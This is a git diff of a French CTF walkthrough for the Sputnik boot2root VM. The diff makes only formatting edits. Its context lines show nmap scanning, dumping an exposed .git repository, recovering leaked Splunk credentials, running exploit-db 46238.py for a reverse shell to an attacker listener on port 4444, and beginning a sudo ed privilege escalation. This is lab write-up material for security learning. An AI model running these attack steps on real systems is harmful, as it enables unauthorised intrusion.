@@ -8,7 +8,7 @@ _Sputnik is an easy level boot2root machine designed to be a challenge for secur
 
 ## Recherche d'informations
 
-Pour commencer, l'outil [netdiscover](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Sputnik : il s'agit de 192.168.56.101.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM Sputnik : il s'agit de 192.168.56.101.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -23,7 +23,7 @@ _____________________________________________________________________________
 192.168.56.101  08:00:27:d8:0b:51      1      60  PCS Systemtechnik GmbH
 ```
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan [nmap](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. En premier lieu, il semble possible de se connecter à l'interface d'administration de Splunk Enterprise sur le port 61337, sous réserve évidemment de connaître les bons identifiants.
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. En premier lieu, il semble possible de se connecter à l'interface d'administration de Splunk Enterprise sur le port 61337, sous réserve évidemment de connaître les bons identifiants.
 
 [Splunk](https://en.wikipedia.org/wiki/Splunk#Products) est un outil de collecte et d'analyse d'importants volumes de données, qui les restitue dans de jolis graphiques et tableaux de bord. Elle utilise une API standard permettant une connexion directe du service vers les applications et les appareils, joignable via le port ouvert 8089. Une base de données MongoDB semble être installée sur le serveur (port 8191) et, le meilleur pour la fin, une instance du jeu vidéo [Flappy Bird](https://en.wikipedia.org/wiki/Flappy_Bird) développé par Nguyễn Hà Đông est déployée sur un serveur Web, accessible via le port 55555 !
 
@@ -77,7 +77,7 @@ Nmap done: 1 IP address (1 host up) scanned in 64.31 seconds
 
 ![Affichage de l'image Sputnik_flappy55555.png](images/Sputnik_flappy55555.png)
 
-Force est de constater qu'il n'y a pas grand-chose à se mettre sous la dent : la connexion à l'interface d'administration de Splunk nécessite un couple d'identifiants, et ceux par défaut (admin/changeme) ne fonctionnent pas. Idem pour l'accès à l'API 'Atom Feed'. En revanche, l'utilisation de l'option ```-A``` de nmap a mis en évidence la présence d'un [dépôt Git](https://en.wikipedia.org/wiki/Git), accessible sans aucune authentification sur le serveur Web Apache via le port 55555. Si l'existence du jeu mobile Flappy Bird sur ce serveur est surprenante, celle du dépôt Git associé a le don d'intriguer.
+Force est de constater qu'il n'y a pas grand-chose à se mettre sous la dent : la connexion à l'interface d'administration de Splunk nécessite un couple d'identifiants, et ceux par défaut ```admin:changeme``` ne fonctionnent pas. Idem pour l'accès à l'API _Atom Feed_. En revanche, l'utilisation de l'option ```-A``` de nmap a mis en évidence la présence d'un [dépôt Git](https://en.wikipedia.org/wiki/Git), accessible sans aucune authentification sur le serveur Web Apache via le port 55555. Si l'existence du jeu mobile Flappy Bird sur ce serveur est surprenante, celle du dépôt Git associé a le don d'intriguer.
 
 ```console
 root@blinils:~# nmap -h | grep '\-A'
@@ -85,7 +85,7 @@ root@blinils:~# nmap -h | grep '\-A'
   nmap -v -A scanme.nmap.org
 ```
 
-Ainsi, tout comme lors du [huitième CTF](/CTF-VulnLabs/lampsecurity-CTF8) de LampSecurity, [le script gitdumper.sh](https://github.com/internetwache/GitTools) développé par [Sebastian Neef](https://neef.it/) va être mis en oeuvre pour cette VM boot2root. Lecture recommandée : _[Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)_ sur le blog d'Internetwache.
+Ainsi, tout comme lors du [huitième CTF](/CTF-VulnLabs/lampsecurity-CTF8) de LAMPSecurity, le script [__gitdumper.sh__](https://github.com/internetwache/GitTools) développé par [Sebastian Neef](https://neef.it/) va être mis en oeuvre pour cette VM boot2root. Lecture recommandée : _[Don't publicly expose .git or how we downloaded your website's sourcecode - An analysis of Alexa's 1M](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)_ sur le blog d'Internetwache.
  
 ```console
 root@blinils:~# ./gitdumper.sh http://192.168.56.103:55555/.git/ git-dump
@@ -134,11 +134,11 @@ root@blinils:~/git-dump/.git/logs# cat HEAD
 clone: from https://github.com/ameerpornillos/flappy.git
 ```
  
-En réalité, ce dépôt Github flappy.git n'appartient à nul autre qu'au créateur de ce CTF. En fouillant les commits, un couple d'identifiants finit par apparaître à l'écran, au sein d'un fichier nommé _secret_. Le propriétaire du dépôt Github s'est aperçu de sa maladresse et a aussitôt effacé le fichier, mais le mal est fait : l'historique des commits nous donne ce qui semble être le login ```sputnik``` et le mot de passe ```ameer_says_thank_you_and_good_job``` tant convoités pour accéder à Splunk.
+En réalité, ce dépôt Github ```flappy.git``` n'appartient à nul autre qu'au créateur de ce CTF. En fouillant les commits, un couple d'identifiants finit par apparaître à l'écran, au sein d'un fichier nommé ```secret```. Le propriétaire du dépôt Github s'est aperçu de sa maladresse et a aussitôt effacé le fichier, mais le mal est fait : l'historique des commits nous donne ce qui semble être le login ```sputnik``` et le mot de passe ```ameer_says_thank_you_and_good_job``` tant convoités pour accéder à Splunk.
  
 ![Affichage de l'image Sputnik_secretGit.png](images/Sputnik_secretGit.png)
 
-La recherche avec les mots-clés « _splunk exploit_ » s'avère fructueuse. En effet, elle renvoie plusieurs entrées sur le site Exploit Database dont une [divulgation d'informations](https://www.exploit-db.com/exploits/44865) (_Information Disclosure_) et une [exécution de code à distance](https://www.exploit-db.com/exploits/46238) (_Remote Code Execution_), ainsi que deux articles très intéressants sur l'exploitation de Splunk : _[Popping shells on Splunk](https://www.n00py.io/2018/10/popping-shells-on-splunk/)_ par n00py et _[Penetration Testing with Splunk: Leveraging Splunk Admin Credentials to Own the Enterprise](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/)_ par Kevin Dick.
+La recherche avec les mots-clés ```splunk exploit``` s'avère fructueuse. En effet, elle renvoie plusieurs entrées sur le site Exploit Database dont une [divulgation d'informations](https://www.exploit-db.com/exploits/44865) (_Information Disclosure_) et une [exécution de code à distance](https://www.exploit-db.com/exploits/46238) (_Remote Code Execution_), ainsi que deux articles très intéressants sur l'exploitation de Splunk : _[Popping shells on Splunk](https://www.n00py.io/2018/10/popping-shells-on-splunk/)_ par n00py et _[Penetration Testing with Splunk: Leveraging Splunk Admin Credentials to Own the Enterprise](https://threat.tevora.com/penetration-testing-with-splunk-leveraging-splunk-admin-credentials-to-own-the-enterprise/)_ par Kevin Dick.
 
 ![Affichage de l'image Sputnik_homepageSplunk.png](images/Sputnik_homepageSplunk.png)
 
@@ -150,7 +150,7 @@ Référencée par l'identifiant [CVE-2018-11409](https://nvd.nist.gov/vuln/detai
 
 ## Splunk Enterprise 7.2.3 - Authenticated Custom App RCE
 
-Cette vulnérabilité-ci ne devrait pas non plus être exploitable sur cette VM... et pourtant, ça marche ! L'exploit [46238.py](files/46238.py) développé par Lee Mazzoleni nécessite l'installation de [geckodriver](https://github.com/mozilla/geckodriver/releases) et de [Selenium](https://en.wikipedia.org/wiki/Selenium_(software)), qui automatisent les actions qu'un utilisateur devrait effectuer manuellement : ouverture d'une page, remplissage d'un formulaire, clic sur un lien...
+Cette vulnérabilité-ci ne devrait pas non plus être exploitable sur cette VM... et pourtant, ça marche ! L'exploit [```46238.py```](files/46238.py) développé par Lee Mazzoleni nécessite l'installation de [geckodriver](https://github.com/mozilla/geckodriver/releases) et de [Selenium](https://en.wikipedia.org/wiki/Selenium_(software)), qui automatisent les actions qu'un utilisateur devrait effectuer manuellement : ouverture d'une page, remplissage d'un formulaire, clic sur un lien...
 
 ```console
 root@blinils:~# wget -q https://www.exploit-db.com/download/46238 -O 46238.py
@@ -169,7 +169,7 @@ root@blinils:~# tree /root
 4 directories, 2 files
 ```
 
-Une fois l'installation terminée, il est temps de lancer l'exploit... après l'avoir relu et analysé, bien évidemment ! C'est magique : le bot se charge tout seul d'ouvrir le navigateur, de se connecter à Splunk avec les identifiants fournis, de cliquer au bon endroit afin d'accéder au menu Uploads, puis de constituer et de charger l'app nommée [splunk-shell.tar.gz](files/splunk-shell.tar.gz) (disponible sur ce dépôt).
+Une fois l'installation terminée, il est temps de lancer l'exploit... après l'avoir relu et analysé, bien évidemment ! C'est magique : le bot se charge tout seul d'ouvrir le navigateur, de se connecter à Splunk avec les identifiants fournis, de cliquer au bon endroit afin d'accéder au menu ```Uploads``` puis de constituer et de charger l'app nommée [```splunk-shell.tar.gz```](files/splunk-shell.tar.gz) (disponible sur ce dépôt).
 
 ```console
 root@blinils:~# python 46238.py http://192.168.56.101:61337 sputnik ameer_says_thank_you_and_good_job 192.168.56.102 4444
@@ -191,7 +191,7 @@ uid=1001(splunk) gid=1001(splunk) groups=1001(splunk)
 $ 
 ```
 
-C'est tout bon, nous disposons d'un shell sur la VM ! Au fait, à quoi ressemble splunk-shell.tar.gz ?
+C'est tout bon, nous disposons d'un shell sur la VM ! Au fait, à quoi ressemble ```splunk-shell.tar.gz``` ?
 
 ```console
 root@blinils:~# tar -xzf splunk-shell.tar.gz
@@ -241,7 +241,7 @@ sourcetype = fun
 
 ## Élévation de privilèges avec le binaire ed
 
-L'objectif est désormais de devenir root sur le serveur Sputnik. Une rapide vérification avec [LinEnum.sh](https://github.com/rebootuser/LinEnum) et [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker) permet de s'orienter vers une solution beaucoup plus simple que prévu : le compte Unix _splunk_ et le compte _sputnik_ partagent le même mot de passe. La commande ```sudo -l``` affiche la configuration sudo pour l'utilisateur courant ; l'utilisateur _splunk_ est autorisé à exécuter la commande /bin/ed via sudo. Un petit tour sur l'excellent site [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) nous permet d'obtenir un snippet pour élever nos privilèges et passer root avec le binaire ed.
+L'objectif est désormais de devenir root sur le serveur Sputnik. Une rapide vérification avec [__LinEnum.sh__](https://github.com/rebootuser/LinEnum) et [__linuxprivchecker.py__](https://github.com/sleventyeleven/linuxprivchecker) permet de s'orienter vers une solution beaucoup plus simple que prévu : le compte Unix ```splunk``` et le compte ```sputnik``` partagent le même mot de passe. La commande ```sudo -l``` affiche la configuration sudo pour l'utilisateur courant ; l'utilisateur ```splunk``` est autorisé à exécuter la commande ```/bin/ed``` via sudo. Un petit tour sur l'excellent site [GTFOBins](https://gtfobins.github.io/gtfobins/perl/) nous permet d'obtenir un snippet pour élever nos privilèges et passer root avec le binaire ed.
 
 ```console
 splunk@sputnik:/$ sudo -l
